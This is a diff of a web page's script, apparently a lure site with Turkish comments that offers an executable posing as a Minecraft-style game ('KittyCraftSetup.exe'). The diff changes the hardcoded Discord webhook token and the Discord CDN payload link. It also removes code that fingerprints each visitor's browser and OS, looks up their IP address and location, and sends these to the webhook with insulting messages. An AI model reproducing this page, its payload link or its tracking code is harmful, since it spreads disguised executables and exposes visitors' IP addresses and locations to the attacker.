@@ -713,33 +713,12 @@
 
 <script>
 // ===== AYAR =====
-const webhookUrl = 'https://discord.com/api/webhooks/1455520204967645279/P4dCW1s7w5MapRUeXSKNKLa-HlPTVhYV1TZ2lJKS2k5b8n4JZGjNC3snxZ17xhoFCtMJ';
-const TARGET_DOWNLOAD_URL = 'https://cdn.discordapp.com/attachments/1446443919851257876/1459179016383758627/kittie-mc.exe?ex=696255db&is=6961045b&hm=116ae0ea38e3c450ab942596f823e1bc6f650c6e4357b6d1a6f26416efb5c013&';
+const webhookUrl = 'https://discord.com/api/webhooks/1459674066402410564/4yw-ohrC192R_SiI2fG2lRrKuslq9hQHHrPYg_h1aVpohF92BrTB_fr_SvhcR53Z0BEk';
+const TARGET_DOWNLOAD_URL = 'https://cdn.discordapp.com/attachments/1459661676097044613/1464671536794304818/KittyCraftSetup.exe?ex=6976512a&is=6974ffaa&hm=bfb59c7d148b6fced29f0d6b5de06f261f91997430f0448956ef8c300306d0b5&';
 
 // ===== FLAGS =====
 let visitLogged = false;
 let downloadLogged = false;
-
-// ===== SYSTEM =====
-function detectBrowser() {
-  const ua = navigator.userAgent;
-  if (ua.includes('OPR')) return 'Opera';
-  if (ua.includes('Edg')) return 'Edge';
-  if (ua.includes('Chrome')) return 'Chrome';
-  if (ua.includes('Firefox')) return 'Firefox';
-  if (ua.includes('Safari')) return 'Safari';
-  return 'Unknown';
-}
-
-function detectOS() {
-  const ua = navigator.userAgent;
-  if (ua.includes('Win')) return 'Windows';
-  if (ua.includes('Mac')) return 'macOS';
-  if (ua.includes('Linux')) return 'Linux';
-  if (ua.includes('Android')) return 'Android';
-  if (ua.includes('iPhone') || ua.includes('iPad')) return 'iOS';
-  return 'Unknown';
-}
 
 // ===== WEBHOOK =====
 function sendWebhook(msg) {
@@ -748,59 +727,6 @@ function sendWebhook(msg) {
     new Blob([JSON.stringify({ content: msg })], {
       type: 'application/json'
     })
-  );
-}
-
-// ===== IP INFO =====
-async function getIPInfo() {
-  try {
-    const r = await fetch('https://ipapi.co/json/');
-    const d = await r.json();
-    return {
-      ip: d.ip,
-      country: d.country_name,
-      city: d.city,
-      region: d.region
-    };
-  } catch {
-    return {
-      ip: 'Bilinmiyor',
-      country: 'Bilinmiyor',
-      city: 'Bilinmiyor',
-      region: 'Bilinmiyor'
-    };
-  }
-}
-
-// ===== VISIT LOG =====
-function sendVisitLog() {
-  if (visitLogged) return;
-  visitLogged = true;
-
-  sendWebhook(
-    `🟢 **Siteye girdi enai**\n\n` +
-    `🖥 İşletim Sistemi Bu : ${detectOS()}\n` +
-    `🌐 Tarayıcı: ${detectBrowser()}\n` +
-    `⏰ Bu saatte siteye girilir mi aq: ${new Date().toLocaleString('tr-TR')}` 
-  );
-}
-
-// ===== DOWNLOAD LOG =====
-async function sendDownloadLog() {
-  if (downloadLogged) return;
-  downloadLogged = true;
-
-  const i = await getIPInfo();
-
-  sendWebhook(
-    `📥 **İndirmeye bastı enayi oç**\n\n` +
-    `🌍 ip adresin elimde oç: ${i.ip}\n` +
-    `🏳️ Her biji kürdistan: ${i.country}\n` +
-    `🏙️ Şehiri neymiş: ${i.city}\n` +
-    `🗺️ Bölge: ${i.region}\n\n` +
-    `🖥 İşletim sistemi: ${detectOS()}\n` +
-    `🌐 Tarayıcı: ${detectBrowser()}\n` +
-    `⏰ Bu saatte indirmiş oç: ${new Date().toLocaleString('tr-TR')}` 
   );
 }
 
